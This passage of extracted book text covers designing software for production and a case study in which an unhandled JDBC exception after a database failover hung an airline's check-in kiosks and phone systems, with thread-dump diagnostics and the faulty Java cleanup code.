stability, the next concern is ongoing operations. In Part II: Design for Production, you’ll see what it means to live in production. You’ll deal with the complexity of modern production environments in all their virtualized, con- tainerized, load-balanced, service-discovered gory detail. This part illustrates\n\nreport erratum • discuss",
      "content_length": 2084,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 14,
      "content": "Preface • xiv\n\ngood patterns for control, transparency, and availability in physical data centers and cloud environments.\n\nIn Part III: Deliver Your System, you’ll look at deployments. There are great tools for pouring bits onto servers now, but that turns out to be the easy part of the problem. It’s much harder to push frequent, small changes without breaking consumers. We’ll look at design for deployment and at deployments without downtime, and then we’ll move into versioning across disparate ser- vices—always a tricky issue!\n\nIn Part IV: Solve Systemic Problems, you’ll examine the system’s ongoing life as part of the overall information ecosystem. If release 1.0 is the birth of the system, then you need to think about its growth and development after that. In this part, you’ll see how to build systems that can grow, flex, and adapt over time. This includes evolutionary architecture and shared “knowledge” across systems. Finally, you’ll learn how to build antifragile systems through the emerging discipline of “chaos engineering” that uses randomness and deliberate stress on a system to improve it.\n\nAbout the Case Studies\n\nI included several extended case studies to illustrate the major themes of this book. These case studies are taken from real events and real system failures that I have personally observed. These failures were very costly and embar- rassing for those involved. Therefore, I obfuscated some information to protect the identities of the companies and people involved. I also changed the names of the systems, classes, and methods. Only such nonessential details have been changed, however. In each case, I maintained the same industry, sequence of events, failure mode, error propagation, and outcome. The costs of these failures are not exaggerated. These are real companies, and this is real money. I preserved those figures to underscore the seriousness of this material. Real money is on the line when systems fail.\n\nOnline Resources\n\nThis book has its own web page,1 where you can find details about it, download the source code, post to the discussion forums, and report errata such as typos and content suggestions. The discussion forums are the perfect place to talk shop with other readers and share your comments about the book.\n\nNow, let’s get started with an introduction to living in production.\n\n1.\n\nhttps://pragprog.com/titles/mnee2/46\n\nreport erratum • discuss",
      "content_length": 2416,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 15,
      "content": "CHAPTER 1\n\nLiving in Production\n\nYou’ve worked hard on your project. It looks like all the features are actu- ally complete, and most even have tests. You can breathe a sigh of relief. You’re done.\n\nOr are you?\n\nDoes “feature complete” mean “production ready”? Is your system really ready to be deployed? Can it be run by operations and face the hordes of real-world users without you? Are you starting to get that sinking feeling that you’ll be faced with late-night emergency phone calls and alerts? It turns out there’s a lot more to development than just adding all the features.\n\nSoftware design as taught today is terribly incomplete. It only talks about what systems should do. It doesn’t address the converse—what systems should not do. They should not crash, hang, lose data, violate privacy, lose money, destroy your company, or kill your customers.\n\nToo often, project teams aim to pass the quality assurance (QA) department’s tests instead of aiming for life in production. That is, the bulk of your work probably focuses on passing testing. But testing—even agile, pragmatic, automated testing—is not enough to prove that software is ready for the real world. The stresses and strains of the real world, with crazy real users, globe- spanning traffic, and virus-writing mobs from countries you’ve never even heard of go well beyond what you could ever hope to test for.\n\nBut first, you will need to accept the fact that despite your best laid plans, bad things will still happen. It’s always good to prevent them when possible, of course. But it can be downright fatal to assume that you’ve predicted and eliminated all possible bad events. Instead, you want to take action and pre- vent the ones you can but make sure that your system as a whole can recover from whatever unanticipated, severe traumas might befall it.\n\nreport erratum • discuss",
      "content_length": 1858,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 16,
      "content": "Chapter 1. Living in Production • 2\n\nAiming for the Right Target\n\nMost software is designed for the development lab or the testers in the QA department. It is designed and built to pass tests such as, “The customer’s first and last names are required, but the middle initial is optional.” It aims to survive the artificial realm of QA, not the real world of production.\n\nSoftware design today resembles automobile design in the early ’90s—discon- nected from the real world. Cars designed solely in the cool comfort of the lab looked great in models and CAD systems. Perfectly curved cars gleamed in front of giant fans, purring in laminar flow. The designers inhabiting these serene spaces produced designs that were elegant, sophisticated, clever, fragile, unsatisfying, and ultimately short-lived. Most software architecture and design happens in equally clean, distant environs.\n\nDo you want a car that looks beautiful but spends more time in the shop than on the road? Of course not! You want to own a car designed for the real world. You want a car designed by somebody who knows that oil changes are always 3,000 miles late, that the tires must work just as well on the last sixteenth of an inch of tread as on the first, and that you will certainly, at some point, stomp on the brakes while holding an Egg McMuffin in one hand and a phone in the other.\n\nWhen our system passes QA, can we say with confidence that it’s ready for production? Simply passing QA tells us little about the system’s suitability for the next three to ten years of life. It could be the Toyota Camry of software, racking up thousands of hours of continuous uptime. Or it could be the Chevy Vega (a car whose front end broke off on the company’s own test track) or the Ford Pinto (a car prone to blowing up when hit in just the right way). It’s impossible to tell from a few days or even a few weeks of testing what the next several years will bring.\n\nProduct designers in manufacturing have long pursued “design for manufac- turability”—the engineering approach of designing products such that they can be manufactured at low cost and high quality. Prior to this era, product designers and fabricators lived in different worlds. Designs thrown over the wall to production included screws that could not be reached, parts that were easily confused, and custom parts where off-the-shelf components would serve. Inevitably, low quality and high manufacturing cost followed.\n\nWe’re in a similar state today. We end up falling behind on the new system because we’re constantly taking support calls from the last half-baked project we shoved out the door. Our analog of “design for manufacturability” is “design\n\nreport erratum • discuss",
      "content_length": 2714,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 17,
      "content": "The Scope of the Challenge • 3\n\nfor production.” We don’t hand designs to fabricators, but we do hand finished software to IT operations. We need to design individual software systems, and the whole ecosystem of interdependent systems, to operate at low cost and high quality.\n\nThe Scope of the Challenge\n\nIn the easy, laid-back days of client/server systems, a system’s user base would be measured in the tens or hundreds, with a few dozen concurrent users at most. Today we routinely see active user counts larger than the population of entire continents. And I’m not just talking about Antarctica and Australia here! We’ve seen our first billion-user social network, and it won’t be the last.\n\nUptime demands have increased too. Whereas the famous “five nines” (99.999 percent) uptime was once the province of the mainframe and its caretakers, even garden-variety commerce sites are now expected to be available 24 by 7 by 365. (That phrase has always bothered me. As an engineer, I expect it to either be “24 by 365” or be “24 by 7 by 52.”) Clearly, we’ve made tremendous strides even to consider the scale of software built today; but with the increased reach and scale of our systems come new ways to break, more hostile environments, and less tolerance for defects.\n\nThe increasing scope of this challenge—to build software fast that’s cheap to build, good for users, and cheap to operate—demands continually improving architecture and design techniques. Designs appropriate for small WordPress websites fail outrageously when applied to large scale, transactional, distribut- ed systems, and we’ll look at some of those outrageous failures.\n\nA Million Dollars Here, a Million Dollars There\n\nA lot is on the line here: your project’s success, your stock options or profit sharing, your company’s survival, and even your job. Systems built for QA often require so much ongoing expense, in the form of operations cost, downtime, and software maintenance, that they never reach profitability, let alone net positive cash for the business (reached only after the profits gener- ated by the system pay back the costs incurred in building it.) These systems exhibit low availability, direct losses in missed revenue, and indirect losses through damage to the brand.\n\nDuring the hectic rush of a development project, you can easily make decisions that optimize development cost at the expense of operational cost. This makes sense only in the context of the team aiming for a fixed budget and delivery\n\nreport erratum • discuss",
      "content_length": 2527,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 18,
      "content": "Chapter 1. Living in Production • 4\n\ndate. In the context of the organization paying for the software, it’s a bad choice. Systems spend much more of their life in operation than in develop- ment—at least, the ones that don’t get canceled or scrapped do. Avoiding a one-time developmental cost and instead incurring a recurring operational cost makes no sense. In fact, the opposite decision makes much more financial sense. Imagine that your system requires five minutes of downtime on every release. You expect your system to have a five-year life span with monthly releases. (Most companies would like to do more releases per year, but I’m being very conservative.) You can compute the expected cost of downtime, dis- counted by the time-value of money. It’s probably on the order of $1,000,000 (300 minutes of downtime at a very modest cost of $3,000 per minute).\n\nNow suppose you could invest $50,000 to create a build pipeline and deployment process that avoids downtime during releases. That will, at a minimum, avoid the million-dollar loss. It’s very likely that it will also allow you to increase deployment frequency and capture market share. But let’s stick with the direct gain for now. Most CFOs would not mind authorizing an expenditure that returns 2,000 percent ROI!\n\nDesign and architecture decisions are also financial decisions. These choices must be made with an eye toward their implementation cost as well as their downstream costs. The fusion of technical and financial viewpoints is one of the most important recurring themes in this book.\n\nUse the Force\n\nYour early decisions make the biggest impact on the eventual shape of your system. The earliest decisions you make can be the hardest ones to reverse later. These early decisions about the system boundary and decomposition into subsystems get crystallized into the team structure, funding allocation, program management structure, and even time-sheet codes. Team assignments are the first draft of the architecture. It’s a terrible irony that these very early decisions are also the least informed. The beginning is when your team is most ignorant of the eventual structure of the software, yet that’s when some of the most irrevocable decisions must be made.\n\nI’ll reveal myself here and now as a proponent of agile development. The emphasis on early delivery and incremental improvements means software gets into production quickly. Since production is the only place to learn how the software will respond to real-world stimuli, I advocate any approach that begins the learning process as soon as possible. Even on agile projects, deci- sions are best made with foresight. It seems as if the designer must “use the force” to see the future in order to select the most robust design. Because\n\nreport erratum • discuss",
      "content_length": 2799,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 19,
      "content": "Pragmatic Architecture • 5\n\ndifferent alternatives often have similar implementation costs but radically different life-cycle costs, it is important to consider the effects of each decision on availability, capacity, and flexibility. I’ll show you the downstream effects of dozens of design alternatives, with concrete examples of beneficial and harmful approaches. These examples all come from real systems I’ve worked on. Most of them cost me sleep at one time or another.\n\nPragmatic Architecture\n\nTwo divergent sets of activities both fall under the term architecture. One type of architecture strives toward higher levels of abstraction that are more portable across platforms and less connected to the messy details of hardware, networks, electrons, and photons. The extreme form of this approach results in the “ivory tower”—a Kubrick-esque clean room inhabited by aloof gurus and decorated with boxes and arrows on every wall. Decrees emerge from the ivory tower and descend upon the toiling coders. “The middleware shall be JBoss, now and forever!” “All UIs shall be constructed with Angular 1.0!” “All that is, all that was, and all that shall ever be lives in Oracle!” “Thou shalt not engage in Ruby!” If you’ve ever gritted your teeth while coding something according to the “com- pany standards” that would be ten times easier with some other technology, then you’ve been the victim of an ivory-tower architect. I guarantee that an architect who doesn’t bother to listen to the coders on the team doesn’t bother listening to the users either. You’ve seen the result: users who cheer when the system crashes because at least then they can stop using it for a while.\n\nIn contrast, another breed of architect doesn’t just rub shoulders with the coders but is one. This kind of architect does not hesitate to peel back the lid on an abstraction or to jettison one if it doesn’t fit. This pragmatic architect is more likely to discuss issues such as memory usage, CPU requirements, bandwidth needs, and the benefits and drawbacks of hyperthreading and CPU binding.\n\nThe ivory-tower architect most enjoys an end-state vision of ringing crystal perfection, but the pragmatic architect constantly thinks about the dynamics of change. “How can we do a deployment without rebooting the world?” “What metrics do we need to collect, and how will we analyze them?” “What part of the system needs improvement the most?” When the ivory-tower architect is done, the system will not admit any improvements; each part will be perfectly adapted to its role. Contrast that to the pragmatic architect’s creation, in which each component is good enough for the current stresses—and the architect knows which ones need to be replaced depending on how the stress factors change over time.\n\nreport erratum • discuss",
      "content_length": 2802,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 20,
      "content": "Chapter 1. Living in Production • 6\n\nIf you’re already a pragmatic architect, then I’ve got chapters full of powerful ammunition for you. If you’re an ivory-tower architect—and you haven’t already stopped reading—then this book might entice you to descend through a few levels of abstraction to get back in touch with that vital intersection of soft- ware, hardware, and users: living in production. You, your users, and your company will be much happier when the time comes to finally release it!\n\nWrapping Up\n\nSoftware delivers its value in production. The development project, testing, integration, and planning...everything before production is prelude. This book deals with life in production, from the initial release through ongoing growth and evolution of the system. The first part of this book deals with stability. To get a better sense of the kind of issues involved in keeping your software from crashing, let’s start by looking at the software bug that grounded an airline.\n\nreport erratum • discuss",
      "content_length": 1013,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 21,
      "content": "Part I\n\nCreate Stability",
      "content_length": 24,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 22,
      "content": "CHAPTER 2\n\nCase Study: The Exception That Grounded an Airline\n\nHave you ever noticed that the incidents that blow up into the biggest issues start with something very small? A tiny programming error starts the snowball rolling downhill. As it gains momentum, the scale of the problem keeps getting bigger and bigger. A major airline experienced just such an incident. It even- tually stranded thousands of passengers and cost the company hundreds of thousands of dollars. Here’s how it happened.\n\nAs always, all names, places, and dates have been changed to protect the confidentiality of the people and companies involved.\n\nIt started with a planned failover on the database cluster that served the core facilities (CF). The airline was moving toward a service-oriented architecture, with the usual goals of increasing reuse, decreasing development time, and decreasing operational costs. At this time, CF was in its first generation. The CF team planned a phased rollout, driven by features. It was a sound plan, and it probably sounds familiar—most large companies have some variation of this project underway now.\n\nCF handled flight searches—a common service for any airline application. Given a date, time, city, airport code, flight number, or any combination thereof, CF could find and return a list of flight details. When this incident happened, the self-service check-in kiosks, phone menus, and “channel partner” applications had been updated to use CF. Channel partner applica- tions generate data feeds for big travel-booking sites. IVR and self-service check-in are both used to put passengers on airplanes—“butts in seats,” in the vernacular. The development schedule had plans for new releases of the gate agent and call center applications to transition to CF for flight lookup,\n\nreport erratum • discuss",
      "content_length": 1821,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 23,
      "content": "Chapter 2. Case Study: The Exception That Grounded an Airline • 10\n\nbut those had not been rolled out yet. This turned out to be a good thing, as you’ll soon see.\n\nThe architects of CF were well aware of how critical it would be to the business. They built it for high availability. It ran on a cluster of J2EE application servers with a redundant Oracle 9i database. All the data were stored on a large external RAID array with twice-daily, off-site backups on tape and on- disk replicas in a second chassis that were guaranteed to be five minutes old at most. Everything was on real hardware, no virtualization. Just melted sand, spinning rust, and the operating systems.\n\nThe Oracle database server ran on one node of the cluster at a time, with Veritas Cluster Server controlling the database server, assigning the virtual IP address, and mounting or unmounting filesystems from the RAID array. Up front, a pair of redundant hardware load balancers directed incoming traffic to one of the application servers. Client applications like the server for check-in kiosks and the IVR system would connect to the front-end virtual IP address. So far, so good.\n\nThe diagram on page 11 probably looks familiar. It’s a common high-availability architecture for physical infrastructure, and it’s a good one. CF did not suffer from any of the usual single-point-of-failure problems. Every piece of hardware was redundant: CPUs, drives, network cards, power supplies, network switches, even down to the fans. The servers were even split into different racks in case a single rack got damaged or destroyed. In fact, a second location thirty miles away was ready to take over in the event of a fire, flood, bomb, or attack by Godzilla.\n\nThe Change Window\n\nAs was the case with most of my large clients, a local team of engineers dedi- cated to the account operated the airline’s infrastructure. In fact, that team had been doing most of the work for more than three years when this hap- pened. On the night the problem started, the local engineers had executed a manual database failover from CF database 1 to CF database 2 (see diagram). They used Veritas to migrate the active database from one host to the other. This allowed them to do some routine maintenance to the first host. Totally routine. They had done this procedure dozens of times in the past.\n\nI will say that this was back in the day when “planned downtime” was a normal thing. That’s not the way to operate now.\n\nVeritas Cluster Server was orchestrating the failover. In the space of one minute, it could shut down the Oracle server on database 1, unmount the\n\nreport erratum • discuss",
      "content_length": 2642,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 24,
      "content": "The Change Window • 11\n\nCF Database 1\n\nVirtual IP Address\n\nSCSI\n\nSCSIHardware Load Balancer\n\nVirtual IP Address\n\nHeartbeat\n\nRAID 5Array\n\nCF Database 2\n\nCF App n\n\nCF App 3\n\nCF App 2\n\nCF App 1\n\nfilesystems from the RAID array, remount them on database 2, start Oracle there, and reassign the virtual IP address to database 2. The application servers couldn’t even tell that anything had changed, because they were configured to connect to the virtual IP address only.\n\nThe client scheduled this particular change for a Thursday evening around 11 p.m. Pacific time. One of the engineers from the local team worked with the operations center to execute the change. All went exactly as planned. They migrated the active database from database 1 to database 2 and then updated database 1. After double-checking that database 1 was updated correctly, they migrated the database back to database 1 and applied the same change to database 2. The whole time, routine site monitoring showed that the applications were continuously available. No downtime was planned for this change, and none occurred. At about 12:30 a.m., the crew marked the change as “Completed, Success” and signed off. The local engineer headed for bed, after working a 22-hour shift. There’s only so long you can run on double espressos, after all.\n\nNothing unusual occurred until two hours later.\n\nreport erratum • discuss",
      "content_length": 1384,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 25,
      "content": "Chapter 2. Case Study: The Exception That Grounded an Airline • 12\n\nThe Outage\n\nAt about 2:30 a.m., all the check-in kiosks went red on the monitoring console. Every single one, everywhere in the country, stopped servicing requests at the same time. A few minutes later, the IVR servers went red too. Not exactly panic time, but pretty close, because 2:30 a.m. Pacific time is 5:30 a.m. Eastern time, which is prime time for commuter flight check-in on the Eastern seaboard. The operations center immediately opened a Severity 1 case and got the local team on a conference call.\n\nIn any incident, my first priority is always to restore service. Restoring service takes precedence over investigation. If I can collect some data for postmortem analysis, that’s great—unless it makes the outage longer. When the fur flies, improvisation is not your friend. Fortunately, the team had created scripts long ago to take thread dumps of all the Java applications and snapshots of the databases. This style of automated data collection is the perfect balance. It’s not improvised, it does not prolong an outage, yet it aids postmortem analysis. According to procedure, the operations center ran those scripts right away. They also tried restarting one of the kiosks’ application servers.\n\nThe trick to restoring service is figuring out what to target. You can always “reboot the world” by restarting every single server, layer by layer. That’s almost always effective, but it takes a long time. Most of the time, you can find one culprit that is really locking things up. In a way, it’s like a doctor diagnosing a disease. You could treat a patient for every known disease, but that will be painful, expensive, and slow. Instead, you want to look at the symptoms the patient shows to figure out exactly which disease to treat. The trouble is that individual symptoms aren’t specific enough. Sure, once in a while some symptom points you directly at the fundamental problem, but not usually. Most of the time, you get symptoms—like a fever—that tell you nothing by themselves.\n\nHundreds of diseases can cause fevers. To distinguish between possible causes, you need more information from tests or observations.\n\nIn this case, the team was facing two separate sets of applications that were both completely hung. It happened at almost the same time, close enough that the difference could just be latency in the separate monitoring tools that the kiosks and IVR applications used. The most obvious hypothesis was that both sets of applications depended on some third entity that was in trouble. As you can see from the dependency diagram on page 13, that was a big finger pointing at CF, the only common dependency shared by the kiosks and the IVR system. The fact that CF had a database failover three hours before this\n\nreport erratum • discuss",
      "content_length": 2835,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 26,
      "content": "The Outage • 13\n\nIVRBlade\n\nCheck-inKiosk\n\nCheck-inKiosk\n\nCheck-inKiosk\n\nCheck-inKiosk\n\nIVRBlade\n\nIVRBlade\n\nIVRAppCluster\n\nSabre\n\nTravelSites\n\nCCVS\n\nKioskWestCluster\n\nKioskEastCluster\n\nCF\n\nproblem also made it highly suspect. Monitoring hadn’t reported any trouble with CF, though. Log file scraping didn’t reveal any problems, and neither did URL probing. As it turns out, the monitoring application was only hitting a status page, so it did not really say much about the real health of the CF appli- cation servers. We made a note to fix that error through normal channels later.\n\nRemember, restoring service was the first priority. This outage was approaching the one-hour SLA limit, so the team decided to restart each of the CF applica- tion servers. As soon as they restarted the first CF application server, the IVR systems began recovering. Once all CF servers were restarted, IVR was green but the kiosks still showed red. On a hunch, the lead engineer decided to restart the kiosks’ own application servers. That did the trick; the kiosks and IVR systems were all showing green on the board.\n\nThe total elapsed time for the incident was a little more than three hours.\n\nreport erratum • discuss",
      "content_length": 1203,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 27,
      "content": "Chapter 2. Case Study: The Exception That Grounded an Airline • 14\n\nConsequences\n\nThree hours might not sound like much, especially when you compare that to some legendary outages. (British Airways’ global outage from June 2017— blamed on a power supply failure—comes to mind, for example.) The impact to the airline lasted a lot longer than just three hours, though. Airlines don’t staff enough gate agents to check everyone in using the old systems. When the kiosks go down, the airline has to call in agents who are off shift. Some of them are over their 40 hours for the week, incurring union-contract overtime (time and a half). Even the off-shift agents are only human, though. By the time the airline could get more staff on-site, they could deal only with the backlog. That took until nearly 3 p.m.\n\nIt took so long to check in the early-morning flights that planes could not push back from their gates. They would’ve been half-empty. Many travelers were late departing or arriving that day. Thursday happens to be the day that a lot of “nerd-birds” fly: commuter flights returning consultants to their home cities. Since the gates were still occupied, incoming flights had to be switched to other unoccupied gates. So even travelers who were already checked in still were inconvenienced and had to rush from their original gate to the reallocated gate.\n\nThe delays were shown on Good Morning America (complete with video of pathetically stranded single moms and their babies) and the Weather Chan- nel’s travel advisory.\n\nThe FAA measures on-time arrivals and departures as part of the airline’s annual report card. They also measure customer complaints sent to the FAA about an airline.\n\nThe CEO’s compensation is partly based on the FAA’s annual report card.\n\nYou know it’s going to be a bad day when you see the CEO stalking around the operations center to find out who cost him his vacation home in St. Thomas.\n\nPostmortem\n\nAt 10:30 a.m. Pacific time, eight hours after the outage started, our account representative, Tom (not his real name) called me to come down for a post- mortem. Because the failure occurred so soon after the database failover and maintenance, suspicion naturally condensed around that action. In operations, “post hoc, ergo propter hoc”—Latin for “you touched it last”—turns out to be a good starting point most of the time. It’s not always right, but it certainly provides a place to begin looking. In fact, when Tom called me, he asked me to fly there to find out why the database failover caused this outage.\n\nreport erratum • discuss",
      "content_length": 2574,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 28,
      "content": "Postmortem • 15\n\nOnce I was airborne, I started reviewing the problem ticket and preliminary incident report on my laptop.\n\nMy agenda was simple—conduct a postmortem investigation and answer some questions:\n\nDid the database failover cause the outage? If not, what did? • Was the cluster configured correctly? • Did the operations team conduct the maintenance correctly? • How could the failure have been detected before it became an outage? • Most importantly, how do we make sure this never, ever happens again?\n\nOf course, my presence also served to demonstrate to the client that we were serious about responding to this outage. Not to mention, my investigation was meant to allay any fears about the local team whitewashing the incident. They wouldn’t do such a thing, of course, but managing perception after a major incident can be as important as managing the incident itself.\n\nA postmortem is like a murder mystery. You have a set of clues. Some are reliable, such as server logs copied from the time of the outage. Some are unreliable, such as statements from people about what they saw. As with real witnesses, people will mix observations with speculation. They will present hypotheses as facts. The postmortem can actually be harder to solve than a murder, because the body goes away. There is no corpse to autopsy, because the servers are back up and running. Whatever state they were in that caused the failure no longer exists. The failure might have left traces in the log files or monitoring data collected from that time, or it might not. The clues can be very hard to see.\n\nAs I read the files, I made some notes about data to collect. From the applica- tion servers, I needed log files, thread dumps, and configuration files. From the database servers, I needed configuration files for the databases and the cluster server. I also made a note to compare the current configuration files to those from the nightly backup. The backup ran before the outage, so that would tell me whether any configurations were changed between the backup and my investigation. In other words, that would tell me whether someone was trying to cover up a mistake.\n\nBy the time I got to my hotel, my body said it was after midnight. All I wanted was a shower and a bed. What I got instead was a meeting with our account executive to brief me on developments while I was incommunicado in the air. My day finally ended around 1 a.m.\n\nreport erratum • discuss",
      "content_length": 2454,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 29,
      "content": "Chapter 2. Case Study: The Exception That Grounded an Airline • 16\n\nHunting for Clues\n\nIn the morning, fortified with quarts of coffee, I dug into the database cluster and RAID configurations. I was looking for common problems with clusters: not enough heartbeats, heartbeats going through switches that carry produc- tion traffic, servers set to use physical IP addresses instead of the virtual address, bad dependencies among managed packages, and so on. At that time, I didn’t carry a checklist; these were just problems that I’d seen more than once or heard about through the grapevine. I found nothing wrong. The engineering team had done a great job with the database cluster. Proven, textbook work. In fact, some of the scripts appeared to be taken directly from Veritas’s own training materials.\n\nNext, it was time to move on to the application servers’ configuration. The local engineers had made copies of all the log files from the kiosk application servers during the outage. I was also able to get log files from the CF applica- tion servers. They still had log files from the time of the outage, since it was just the day before. Better still, thread dumps were available in both sets of log files. As a longtime Java programmer, I love Java thread dumps for debugging application hangs.\n\nArmed with a thread dump, the application is an open book, if you know how to read it. You can deduce a great deal about applications for which you’ve never seen the source code. You can tell:\n\nWhat third-party libraries an application uses • What kind of thread pools it has • How many threads are in each • What background processing the application uses • What protocols the application uses (by looking at the classes and methods in each thread’s stack trace)\n\nGetting Thread Dumps\n\nAny Java application will dump the state of every thread in the JVM when you send it a signal 3 (SIGQUIT) on UNIX systems or press Ctrl+Break on Windows systems.\n\nTo use this on Windows, you must be at the console, with a Command Prompt window running the Java application. Obviously, if you are logging in remotely, this pushes you toward VNC or Remote Desktop.\n\nOn UNIX, if the JVM is running directly in a tmux or screen session, you can type Ctrl-\\. Most of the time, the process will be detached from the terminal session, though, so you would use kill to send the signal:\n\nkill -3 18835\n\nreport erratum • discuss",
      "content_length": 2408,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 30,
      "content": "Hunting for Clues • 17\n\nOne catch about the thread dumps triggered at the console: they always come out on “standard out.” Many canned startup scripts do not capture standard out, or they send it to /dev/null. Log files produced with Log4j or java.util.logging cannot show thread dumps. You might have to experiment with your application server’s startup scripts to get thread dumps.\n\nIf you’re allowed to connect to the JVM directly, you can use jcmd to dump the JVM’s threads to your terminal:\n\njcmd 18835 Thread.print\n\nIf you can do that, then you can probably point jconsole at the JVM and browse the threads in a GUI!\n\nHere is a small portion of a thread dump:\n\n\"http-0.0.0.0-8080-Processor25\" daemon prio=1 tid=0x08a593f0 \\\n\nnid=0x57ac runnable [a88f1000..a88f1ccc] at java.net.PlainSocketImpl.socketAccept(Native Method) at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:353) - locked <0xac5d3640> (a java.net.PlainSocketImpl) at java.net.ServerSocket.implAccept(ServerSocket.java:448) at java.net.ServerSocket.accept(ServerSocket.java:419) at org.apache.tomcat.util.net.DefaultServerSocketFactory.\\\n\nacceptSocket(DefaultServerSocketFactory.java:60) at org.apache.tomcat.util.net.PoolTcpEndpoint.\\\n\nacceptSocket(PoolTcpEndpoint.java:368)\n\nat org.apache.tomcat.util.net.TcpWorkerThread.runIt(PoolTcpEndpoint.java:549) at org.apache.tomcat.util.threads.ThreadPool$ControlRunnable.\\\n\nrun(ThreadPool.java:683)\n\nat java.lang.Thread.run(Thread.java:534)\n\n\"http-0.0.0.0-8080-Processor24\" daemon prio=1 tid=0x08a57c30 \\ nid=0x57ab in Object.wait() [a8972000..a8972ccc]\n\nat java.lang.Object.wait(Native Method)\n\nwaiting on <0xacede700> (a \\ org.apache.tomcat.util.threads.ThreadPool$ControlRunnable) at java.lang.Object.wait(Object.java:429) at org.apache.tomcat.util.threads.ThreadPool$ControlRunnable.\\\n\nrun(ThreadPool.java:655) - locked <0xacede700> (a org.apache.tomcat.util.threads.ThreadPool$ControlRunnable)\n\nat java.lang.Thread.run(Thread.java:534)\n\nThey do get verbose.\n\nThis fragment shows two threads, each named something like http-0.0.0.0-8080- ProcessorN. Number 25 is in a runnable state, whereas thread 24 is blocked in Object.wait(). This trace clearly indicates that these are members of a thread pool. That some of the classes on the stacks are named ThreadPool$ControlRunnable() might also be a clue.\n\nreport erratum • discuss",
      "content_length": 2350,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 31,
      "content": "Chapter 2. Case Study: The Exception That Grounded an Airline • 18\n\nIt did not take long to decide that the problem had to be within CF. The thread dumps for the kiosks’ application servers showed exactly what I would expect from the observed behavior during the incident. Out of the forty threads allocated for handling requests from the individual kiosks, all forty were blocked inside SocketInputStream.socketRead0(), a native method inside the internals of Java’s socket library. They were trying vainly to read a response that would never come.\n\nThe kiosk application server’s thread dump also gave me the precise name of the class and method that all forty threads had called: FlightSearch.lookupByCity(). I was surprised to see references to RMI and EJB methods a few frames higher in the stack. CF had always been described as a “web service.” Admittedly, the definition of a web service was pretty loose at that time, but it still seems like a stretch to call a stateless session bean a “web service.”\n\nRemote method invocation (RMI) provides EJB with its remote procedure calls. EJB calls can ride over one of two transports: CORBA (dead as disco) or RMI. As much as RMI made cross-machine communication feel like local programming, it can be dangerous because calls cannot be made to time out. As a result, the caller is vulnerable to problems in the remote server.\n\nThe Smoking Gun\n\nAt this point, the postmortem analysis agreed with the symptoms from the outage itself: CF appeared to have caused both the IVR and kiosk check-in to hang. The biggest remaining question was still, “What happened to CF?”\n\nThe picture got clearer as I investigated the thread dumps from CF. CF’s application server used separate pools of threads to handle EJB calls and HTTP requests. That’s why CF was always able to respond to the monitoring application, even during the middle of the outage. The HTTP threads were almost entirely idle, which makes sense for an EJB server. The EJB threads, on the other hand, were all completely in use processing calls to Flight- Search.lookupByCity(). In fact, every single thread on every application server was blocked at exactly the same line of code: attempting to check out a database connection from a resource pool.\n\nIt was circumstantial evidence, not a smoking gun. But considering the database failover before the outage, it seemed that I was on the right track.\n\nThe next part would be dicey. I needed to look at that code, but the operations center had no access to the source control system. Only binaries were deployed to the production environment. That’s usually a good security precaution, but it was a bit inconvenient at the time. When I asked our account executive\n\nreport erratum • discuss",
      "content_length": 2742,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 32,
      "content": "The Smoking Gun • 19\n\nhow we could get access to the source code, he was reluctant to take that step. Given the scale of the outage, you can imagine that there was plenty of blame floating in the air looking for someone to land on. Relations between Operations and Development—often difficult to start with—were more strained than usual. Everyone was on the defensive, wary of any attempt to point the finger of blame in their direction.\n\nSo, with no legitimate access to the source code, I did the only thing I could do. I took the binaries from production and decompiled them. The minute I saw the code for the suspect EJB, I knew I had found the real smoking gun. Here’s the actual code:\n\npackage com.example.cf.flightsearch; . . . public class FlightSearch implements SessionBean {\n\nprivate MonitoredDataSource connectionPool;\n\npublic List lookupByCity(. . .) throws SQLException, RemoteException {\n\nConnection conn = null; Statement stmt = null;\n\ntry {\n\nconn = connectionPool.getConnection(); stmt = conn.createStatement();\n\n// Do the lookup logic // return a list of results\n\n} finally {\n\nif (stmt != null) {\n\nstmt.close();\n\n}\n\nif (conn != null) {\n\nconn.close();\n\n}\n\n}\n\n}\n\n}\n\nActually, at first glance, this method looks well constructed. Use of the try...finally block indicates the author’s desire to clean up resources. In fact, this very cleanup block has appeared in some Java books on the market. Too bad it contains a fatal flaw.\n\nIt turns out that java.sql.Statement.close() can throw a SQLException. It almost never does. Oracle’s driver does only when it encounters an IOException attempting to close the connection—following a database failover, for instance.\n\nreport erratum • discuss",
      "content_length": 1702,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 33,
      "content": "Chapter 2. Case Study: The Exception That Grounded an Airline • 20\n\nSuppose the JDBC connection was created before the failover. The IP address used to create the connection will have moved from one host to another, but the current state of TCP connections will not carry over to the second database host. Any socket writes will eventually throw an IOException (after the operating system and network driver finally decide that the TCP connection is dead). That means every JDBC connection in the resource pool is an accident waiting to happen.\n\nAmazingly, the JDBC connection will still be willing to create statements. To create a statement, the driver’s connection object checks only its own internal status. (This might be a quirk peculiar to certain versions of Oracle’s JDBC drivers.) If the JDBC connection thinks it’s still connected, then it will create the statement. Executing that statement will throw a SQLException when it does some network I/O. But closing the statement will also throw a SQLException, because the driver will attempt to tell the database server to release resources associated with that statement.\n\nIn short, the driver is willing to create a Statement Object that cannot be used. You might consider this a bug. Many of the developers at the airline certainly made that accusation. The key lesson to be drawn here, though, is that the JDBC specification allows java.sql.Statement.close() to throw a SQLException, so your code has to handle it.\n\nIn the previous offending code, if closing the 